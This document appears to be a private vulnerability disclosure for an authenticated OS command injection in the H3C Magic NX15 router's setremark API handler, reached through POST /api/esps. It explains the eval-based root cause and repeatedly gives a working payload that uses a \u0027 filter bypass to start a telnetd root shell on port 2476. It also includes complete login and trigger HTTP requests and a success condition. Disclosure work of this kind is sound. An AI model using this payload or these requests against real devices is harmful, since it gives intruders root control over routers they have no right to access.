# H3C Magic NX15 `esps.sta.setremark` Authenticated OS Command Injection to Root Remote Code Execution

## Vulnerability Summary

- Discovery date: 2026-06-11
- Researcher: coconut
- Vendor: H3C
- Product: H3C Magic NX15
- Verified firmware / software version: NX15V100R017
- Affected version(s): NX15V100R017 confirmed; other versions not verified
- Component: `usr/libexec/rpcd/esps.sta` `setremark` handler and its `eval ubus call esps.macfilter modify` sink
- Reachable endpoint: `POST /api/esps`
- Reachable method / action: `object="esps.sta"`, `method="setremark"`
- Authentication: administrator
- Attack vector: remote
- Impact: authenticated arbitrary OS command execution as root in a single request
- Root cause class: shell metacharacter injection / OS command injection caused by attacker-controlled data in an `eval` sink
- Candidate CWEs: `CWE-78`
- Disclosure status: private
- CVE ID: pending

## CVE Submission-Style Summary

H3C Magic NX15 firmware `NX15V100R017` contains an authenticated OS command injection vulnerability in the `esps.sta.setremark` handler reachable via `POST /api/esps`. The vulnerable wrapper accepts attacker-controlled input through the JSON field `name`, places it inside a hand-built JSON string, wraps that string in shell quoting, and then reparses it through `eval ubus call esps.macfilter modify`. This allows a remote attacker with a valid administrator session to execute arbitrary OS commands as root via a crafted `name` value.

The issue was verified by source inspection of `usr/libexec/rpcd/esps.sta`, the local report, and the included PoC. On the tested target, exploitation using an invalid MAC still opened a root shell on TCP/2476 and proved root execution with `uid=0(root) gid=0(root)` and the marker string `STA_SETREMARK_RCE_OK`, demonstrating that command execution happens in the `setremark` wrapper itself rather than in later MAC-processing logic.

## Attack Surface

The issue is reachable through the authenticated H3C web management API at `POST /api/esps`. The attacker sends a JSON array whose first element selects `object="esps.sta"` and `method="setremark"`. The attacker controls `param.name` and can even supply an invalid `param.mac`. The backend wrapper constructs a JSON string for a downstream `esps.macfilter.modify` call, places that string in a shell-quoted variable, and reparses it with `eval`.

If useful, the request envelope is:

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json
AUTHENTICATION: <session>
```

And the relevant request or trigger shape is:

```json
[
  {
    "id": 1,
    "object": "esps.sta",
    "method": "setremark",
    "param": {
      "mac": "NOT_A_MAC",
      "name": "x\u0027;echo STA_SETREMARK_RCE_OK >/tmp/sta_setremark_rce_marker; /usr/sbin/telnetd -p 2476 -l /bin/sh >/dev/null 2>&1;#"
    }
  }
]
```

## Authentication Boundary

This issue requires a valid web administrator session token returned by `POST /api/login/auth`.

Minimum authenticated flow:

1. Authenticate to the web interface and obtain `data.session`.
2. Reuse the token in the `AUTHENTICATION` header for `POST /api/esps`.
3. Send a raw JSON body whose `name` field contains the literal wire sequence `\u0027` so that a real quote appears before the wrapper `eval` runs.

The issue remains exploitable if the attacker already has a valid administrator session token.

## Root Cause

### 1. Vulnerable input source

The `setremark` handler reads attacker-controlled `mac` and `name` values from the `/api/esps` request body. Verified fact: the dangerous path is controlled by the `name` field and does not depend on the supplied `mac` being valid.

```text
json_get_var _mac mac
json_get_var _name name
```

### 2. Vulnerable sink

The wrapper places attacker-controlled `_name` into a hand-built JSON string and then reparses the resulting shell command through `eval`.

```text
joint_json='{"mac":"'"$_mac"'","description":"'"$_name"'","internet":"true"}'
para=''"$joint_json"''
eval ubus call esps.macfilter modify "$para"
```

### 3. Why exploitation works

- `name` is directly attacker-controlled.
- The wrapper constructs a JSON string manually instead of using a shell-safe serializer.
- The constructed string is reparsed by `eval`, which turns metacharacters into live shell syntax.
- The outer raw-body quote filter can still be bypassed with the literal wire sequence `\u0027`.
- Runtime proof with `mac="NOT_A_MAC"` shows code execution happens before any later MAC-dependent business logic can prevent it.

### 4. Why naive payloads fail

A direct raw single quote in the body is blocked by the outer `/api/esps` filter. The working exploit must keep the literal wire sequence `\u0027` in the raw JSON body. A key distinguishing property of this issue is that `mac="NOT_A_MAC"` still succeeds, so a tester should not discard a successful shell merely because the supplied MAC would be invalid for later business logic.

## Reverse Engineering Evidence

### Primary function / handler evidence

- file / module: `usr/libexec/rpcd/esps.sta`
- function name: `setremark)`
- function address: `N/A`
- function size: `N/A`

Relevant decompiled or source-level snippet:

```text
json_get_var _mac mac
json_get_var _name name
joint_json='{"mac":"'"$_mac"'","description":"'"$_name"'","internet":"true"}'
para=''"$joint_json"''
eval ubus call esps.macfilter modify "$para"
```

### Control-flow or data-flow summary

`POST /api/esps` -> `esps.sta setremark` -> `json_get_var _name` -> `joint_json` / `para` construction -> `eval ubus call esps.macfilter modify` -> injected shell commands execute -> marker file and telnet shell -> root proof from `id`

## Verified Exploitation Chain

### Mode A: one-request authenticated root RCE via `name`

- prerequisites: network reachability to `192.168.8.1` and a valid administrator session token
- injected field / primitive: `param.name` containing a `\u0027;<payload>;#` sequence
- target path / object / resource: `esps.sta.setremark` wrapper and its `eval ubus call esps.macfilter modify` path
- verified payload:

```text
x\u0027;echo STA_SETREMARK_RCE_OK >/tmp/sta_setremark_rce_marker; /usr/sbin/telnetd -p 2476 -l /bin/sh >/dev/null 2>&1;#
```

Effect:
1. Authenticate to `POST /api/login/auth` and obtain a session token.
2. Send `POST /api/esps` with `object="esps.sta"`, `method="setremark"`, `mac="NOT_A_MAC"`, and the payload above in `name`.
3. The wrapper reparses the generated shell string and opens `telnetd -p 2476 -l /bin/sh`.
4. Connecting to TCP/2476 shows `uid=0(root) gid=0(root)` and the marker file content `STA_SETREMARK_RCE_OK`.

## Live Exploitation Evidence

### PoC-generated payload

```text
x\u0027;echo STA_SETREMARK_RCE_OK >/tmp/sta_setremark_rce_marker; /usr/sbin/telnetd -p 2476 -l /bin/sh >/dev/null 2>&1;#
```

### PoC-sent request body

```json
[
  {
    "id": 1,
    "object": "esps.sta",
    "method": "setremark",
    "param": {
      "mac": "NOT_A_MAC",
      "name": "x\u0027;echo STA_SETREMARK_RCE_OK >/tmp/sta_setremark_rce_marker; /usr/sbin/telnetd -p 2476 -l /bin/sh >/dev/null 2>&1;#"
    }
  }
]
```

### Success condition

A successful TCP connection to `192.168.8.1:2476`, shell output showing `uid=0(root) gid=0(root)`, and the marker file content `STA_SETREMARK_RCE_OK`, even when the supplied MAC is invalid.

## Why This Is Root Remote Code Execution

This issue is correctly classified as root remote code execution because the verified exploit path yields attacker-controlled code execution in the device's privileged management or update-processing context and the observed effects are not limited to inert configuration corruption. The local report and PoC demonstrate that successful exploitation crosses into the root trust boundary and produces attacker-controlled execution or installation effects that are sufficient for full device compromise.

## Minimal HTTP Request Shape

### 1. Authentication request

```http
POST /api/login/auth HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json

{"username":"admin","password":"admin123"}
```

### 2. Trigger request

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json
AUTHENTICATION: <session>

[{"id":1,"object":"esps.sta","method":"setremark","param":{"mac":"NOT_A_MAC","name":"x\u0027;echo STA_SETREMARK_RCE_OK >/tmp/sta_setremark_rce_marker; /usr/sbin/telnetd -p 2476 -l /bin/sh >/dev/null 2>&1;#"}}]
```

## Minimal Vulnerable Flow

```text
Authenticated remote attacker -> `/api/login/auth` -> session token -> `/api/esps` `object=esps.sta` `method=setremark` -> attacker `name` enters wrapper JSON builder -> `eval ubus call esps.macfilter modify` -> root command execution before later MAC validation logic matters
```

## Included Local Submission Artifacts

- Primary local report: `report/postauth_esps_sta_setremark_rce_report.md`
- `poc/postauth_esps_sta_setremark_rce.py`
